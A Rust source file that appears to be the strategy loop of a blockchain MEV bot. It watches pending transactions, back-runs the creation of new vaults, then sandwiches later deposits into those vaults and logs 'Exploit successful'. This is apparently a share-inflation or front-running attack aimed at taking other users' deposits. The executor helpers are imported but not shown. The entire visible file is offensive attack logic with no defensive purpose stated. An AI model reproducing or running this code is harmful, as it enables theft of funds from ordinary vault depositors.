use std::{collections::HashSet, sync::Arc};
use alloy::network::Network;
use alloy::providers::Provider;
use alloy::transports::Transport;
use tokio::sync::broadcast::Sender;
use alloy::primitives::Address;
use crate::utils::helpers::Event;
use crate::utils::simulation::{extract_vault_creation_info, extract_vault_deposit_info};
use crate::utils::executor::Executor;


pub async fn run_strategy<P,T,N>(provider: Arc<P>, event_sender: Sender<Event>)
where
P: Provider<T, N>,
T: Transport + Clone,
N: Network
{
    let mut event_receiver = event_sender.subscribe();
    let mut vault_set: HashSet<Address> = HashSet::new();
    let executor = Executor::new();

    loop {
        match event_receiver.recv().await {
            Ok(event) => match event {
                Event::PendingTx(mut pending_tx) => {
                    let vault_address: Option<Address> = match extract_vault_creation_info(&provider, &mut pending_tx).await {
                        Ok(vault_info) => vault_info,
                        Err(_) => None,
                    };
                    if vault_address.is_none() {
                        continue;
                    }
                    // Back run vault deposit
                    match executor.backrun_creation(&mut pending_tx, vault_address.unwrap()).await {
                        Ok(_) => {
                            vault_set.insert(vault_address.unwrap());
                        },
                        Err(_) => {
                            continue;
                        }
                    }

                    let deposit_info = match extract_vault_deposit_info(
                        &pending_tx,
                        &mut vault_set,
                    ).await {
                        Ok(deposit_info) => deposit_info,
                        Err(_) => None,
                    };

                    if let Some(_deposit_info) = deposit_info {
                        if  !vault_set.contains(&_deposit_info.vault_address) {
                            continue;
                        }
                        match executor.sandwich_deposit(&mut pending_tx, _deposit_info.amount, _deposit_info.vault_address).await {
                            Ok(_) => {
                                vault_set.remove(&_deposit_info.vault_address);
                                log::info!("Exploit successful");
                            },
                            Err(_) => {
                                continue;
                            }
                        }
                    }
                },
                _ => {}
            },
            _ => {}
        }
    }
}